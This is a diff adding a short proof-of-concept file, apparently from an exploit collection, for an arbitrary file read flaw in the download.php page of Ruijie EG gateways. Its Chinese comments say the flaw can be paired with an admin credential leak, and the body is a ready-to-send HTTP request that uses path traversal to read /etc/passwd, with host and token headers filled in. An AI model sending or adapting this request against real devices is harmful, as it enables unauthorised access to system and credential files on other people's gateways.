@@ -1,0 +1,9 @@
+# 锐捷 EG易网关 download.php 任意文件读取漏洞
+# 锐捷EG易网关 download.php 存在后台任意文件读取漏洞，配合 锐捷EG易网关 管理员账号密码泄露漏洞，可以读取服务器任意文件
+GET /download.php?a=read_txt&file=../../../../etc/passwd&acid=80051539&bid=hd_tag_m8mv245e HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv245e
+RM-PRO-Token: 6754c029174b3768ab49c1b6ce4f6bcf
+RM-PRO-Time: 1742808364311
+User-Agent: curl/7.83.1
+
